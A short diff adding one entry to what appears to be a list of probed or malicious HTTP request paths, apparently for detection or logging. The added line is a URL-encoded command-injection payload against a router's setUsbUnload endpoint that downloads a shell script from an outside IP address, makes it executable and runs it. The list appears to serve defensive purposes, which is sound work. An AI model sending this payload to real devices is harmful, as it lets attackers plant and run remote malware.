@@ -1161,3 +1161,4 @@ POST /tmUnblock.cgi
 GET /CFIDE/administrator/
 POST /spywall/timeConfig.php
 POST /functionRouter
+/goform/setUsbUnload/.js?deviceName=A;cd%20/tmp%3Brm%20lilin.sh%3Bwget%20http%3A//64.225.71.35/scripts/lilin.sh%3Bchmod%20777%20lilin.sh%3B./lilin.sh
